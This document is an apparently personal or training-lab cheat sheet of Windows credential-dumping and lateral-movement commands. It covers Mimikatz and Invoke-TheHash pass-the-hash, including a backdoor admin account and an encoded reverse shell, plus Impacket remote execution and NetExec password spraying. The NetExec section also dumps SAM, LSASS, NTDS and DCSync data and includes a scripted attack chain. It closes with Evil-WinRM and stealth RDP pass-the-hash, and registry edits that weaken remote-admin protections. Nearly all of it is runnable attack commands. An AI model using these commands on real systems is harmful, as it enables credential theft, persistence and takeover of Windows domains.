# Windows Account Dump & Lateral Movement Techniques

---

# 1. Mimikatz

## Identify Current Domain Context

```powershell
whoami /fqdn
CN=Administrator,CN=Users,DC=<DOMAIN>,DC=<DOMAIN_EXTENSION>
```

## Pass-The-Hash (PTH)

```powershell
.\mimikatz.exe privilege::debug "sekurlsa::pth /user:<USER> /rc4:<NTLM_HASH> /domain:<DOMAIN>.<DOMAIN_EXTENSION> /run:cmd.exe" exit
```

---

# 2. Invoke-The-Hash

Repository:
https://github.com/Kevin-Robertson/Invoke-TheHash

## Setup

```powershell
Import-Module .\Invoke-TheHash.psd1
```

## Create New Local Admin

```powershell
Invoke-SMBExec -Target <TARGET_IP> -Domain <DOMAIN_NAME> -Username <USER> -Hash <HASH> -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

## Execute Reverse Shell

```powershell
Invoke-SMBExec -Target <TARGET_IP> -Domain <DOMAIN_NAME> -Username <USER> -Hash <HASH> -Command "powershell -enc <BASE64>" -Verbose
```

---

# 3. Impacket Toolkit

Repository:
https://github.com/fortra/impacket

## PSEXEC

```bash
impacket-psexec administrator@10.129.201.126 -hashes :<NTLM_HASH>
```

## WMIEXEC

```bash
impacket-wmiexec administrator@10.129.201.126 -hashes :<NTLM_HASH>
```

### Domain Format

```bash
impacket-wmiexec 'DOMAIN/administrator@10.129.201.126' -hashes :<NTLM_HASH>
```

### CMD Shell

```bash
impacket-wmiexec administrator@10.129.201.126 -hashes :<NTLM_HASH> -shell-type cmd
```

### Silent Mode

```bash
impacket-wmiexec administrator@10.129.201.126 -hashes :<NTLM_HASH> -no-output
```

## SMBEXEC

```bash
impacket-smbexec administrator@10.129.201.126 -hashes :<NTLM_HASH>
```

## SMBCLIENT

```bash
impacket-smbclient DOMAIN/david@DC01 -hashes :<NTLM_HASH>
```

---

# 4. NetExec

## Credential Validation

```bash
netexec smb 10.10.10.5 -u administrator -p Password123
netexec smb 10.10.10.0/24 -u admin -p pass
netexec smb targets.txt -u admin -p pass
netexec smb 10.10.10.0/24 -u users.txt -p Spring2024!
netexec smb 10.10.10.25 -u administrator -H aad3b435b51404eeaad3b435b51404ee:cf3a5525ee9414229e66279623ed5c58
netexec smb 10.10.10.0/24 -u user -p pass --admin
netexec smb dc_ip -u user -p pass --users
netexec smb dc_ip -u user -p pass --groups
netexec smb 10.10.10.5 -u user -p pass --shares

netexec winrm 10.10.10.25 -u admin -p pass
netexec winrm 10.10.10.25 -u admin -p pass -x "whoami"
netexec winrm 10.129.202.136 -u username.list -p password.list

netexec ldap dc_ip -u user -p pass
netexec ldap dc_ip -u user -p pass --users

netexec mssql 10.10.10.30 -u sa -p Password123
netexec mssql 10.10.10.30 -u sa -p pass -x "whoami"

netexec ssh 10.10.10.20 -u root -p toor

netexec smb --list-modules

netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M ntdsutil
netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M sam
netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M lsassy
netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M system
netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M security
netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M secretsdump
netexec smb 172.16.119.11 -u stom -H 21ea958524cfd9a7791737f8d2f764fa -M dcsync
```

## Remote Command Execution

```bash
netexec smb 10.129.201.126 -u Administrator -d . -H <NTLM_HASH> -x whoami
```

## Full SMB Enumeration

```bash
netexec smb 172.16.1.0/24 -u Administrator -d . -H <NTLM_HASH> \
    --gen-relay-list valid_hosts.txt \
    --shares \
    --rid-brute \
    --local-auth \
    --continuous \
    -o OUTPUT_DIR=./enum_results
```

---

## NetExec Professional Attack Chain Script

```bash
#!/bin/bash

TARGET="172.16.1.0/24"
USER="Administrator"
DOMAIN="."
HASH="<NTLM_HASH>"
OUTPUT="netexec_$(date +%Y%m%d_%H%M%S)"

mkdir -p $OUTPUT/{logs,screenshots,loots}

echo "[+] Phase 1: Discovery"
netexec smb $TARGET -u $USER -d $DOMAIN -H $HASH \
    --gen-relay-list $OUTPUT/valid_hosts.txt \
    -o LOGS=$OUTPUT/logs/discovery.log

echo "[+] Phase 2: Enumeration"
netexec smb @$OUTPUT/valid_hosts.txt -u $USER -d $DOMAIN -H $HASH \
    --shares -rid-brute --sessions --disk \
    -o LOGS=$OUTPUT/logs/enum.log

echo "[+] Phase 3: DCSync Check"
netexec smb @$OUTPUT/valid_hosts.txt -u $USER -d $DOMAIN -H $HASH dcsync \
    -o LOGS=$OUTPUT/logs/dcsync.log

echo "[+] Phase 4: SAM Dump"
netexec smb @$OUTPUT/valid_hosts.txt -u $USER -d $DOMAIN -H $HASH sam \
    --local-auth -o LOGS=$OUTPUT/logs/sam.log
```

---

# 5. Evil-WinRM

Default Ports: 5985 / 5986

## Basic Connection

```bash
evil-winrm -i 10.129.201.126 -u Administrator -H <NTLM_HASH> -V
```

## SSL Connection

```bash
evil-winrm -i 10.129.201.126 -u Administrator -H <NTLM_HASH> -r 5986
```

## Load Script Directory

```bash
evil-winrm -i 10.129.201.126 -u Administrator -H <NTLM_HASH> -s ./post_exploits/
```

---

# 6. RDP (Pass-The-Hash)

Default Port: 3389

## Basic PTH

```bash
xfreerdp /v:10.129.201.126 /u:julio /pth:<NTLM_HASH>
```

## Optimized Stealth Mode

```bash
xfreerdp /v:10.129.201.126 /u:julio /pth:<NTLM_HASH> \
    /cert:ignore \
    /sec:nla \
    /bpp:8 \
    -wallpaper \
    -themes \
    -menu-anims \
    /audio-mode:none \
    /vc:off \
    +clipboard
```

---

# 7. Remote Admin Token Fix

## Enable LocalAccountTokenFilterPolicy

```powershell
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System \
    /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

## Enable Restricted Admin

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa \
    /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

---

# Workflow Summary

1. Validate Credentials (NetExec)
2. Enumerate Shares & Users
3. Dump SAM / LSASS (if admin)
4. Attempt DCSync (if domain privilege)
5. Lateral Movement via WinRM / RDP
6. Token Fix if Needed

---

